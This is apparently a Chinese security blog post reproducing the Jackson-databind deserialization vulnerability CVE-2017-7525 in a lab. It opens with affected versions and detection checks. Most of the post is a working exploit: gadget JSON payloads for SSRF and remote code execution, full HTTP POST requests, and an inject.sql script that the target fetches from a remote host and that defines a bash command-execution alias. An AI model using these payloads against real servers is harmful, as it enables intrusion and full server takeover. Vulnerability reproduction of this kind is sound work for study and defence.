---
layout:     post
title:      【漏洞复现】Jackson-databind-远程代码执行漏洞复现与分析（CVE-2017-7525）
subtitle:   反序列化漏洞
date:       2020-10-16
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 漏洞复现 
---
## 0x00 受影响版本
Jackson-databind 2.X < 2.9.9.1
漏洞检测
1.检查xml相关文件对jackson-databind引入情况，判断当前版本是否低于2.9.9.1版本。
2.排查代码中是否调用了enableDefaultTyping方法，
## 0x01 漏洞原理
该漏洞利用除了需要jackson自身的jar包以外还需要logback-core和h2。
该漏洞是由于Jackson黑名单过滤不完整而导致，当开发人员在应用程序中通过ObjectMapper对象调用enableDefaultTyping方法时，程序就会受到此漏洞的影响，攻击者就可利用构造的包含有恶意代码的json数据包对应用进行攻击，直接获取服务器控制权限。
## 0x02 漏洞环境
https://github.com/cnsimo/vu1hub.git
## 0x03 SSRF
Jackson在进行序列化的时候会循环调用序列化对象所属类的每一个get方法，当调用getConnection()方法的时候，就去再去调DriverManager从而去链接远程的数据库，这也就是造成SSRF的原因 
jdbc:h2:mem: 这种写法用于h2操作内存表，并且能在内存中执行sql语句，然后再通过RUNSCRIPT FROM 'http://localhost/inject.sql'来执行从远程获取的sql文件，当然此处改成直接执行本地语句造成命令执行也是可以的。
*POC*
```["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://192.168.80.133:4444/~/test"}]```
```
POST /fuckme HTTP/1.1
Host: IP:8080
Proxy-Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.80.133:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 169
Content-Type: application/x-www-form-urlencoded

poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://192.168.111.1:9999/~/test"}]
```
![-c667](/img/16027819597645.jpg)

## 0x04 RCE
*POC*
```["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.80.133:8080/inject.sql'"}]```

*inject.sql:*
```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOE    xception {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exe    c(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('ping 1.1.1.1')
```
```
POST /fuckme HTTP/1.1
Host: 192.168.111.130:8080
Proxy-Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.80.133:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 172
Content-Type: application/x-www-form-urlencoded

poc=["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.111.1:8080/inject.sql'"}]
```

查看docker进程，成功执行ping 1.1.1.1

![-c762](/img/16027819751564.jpg)

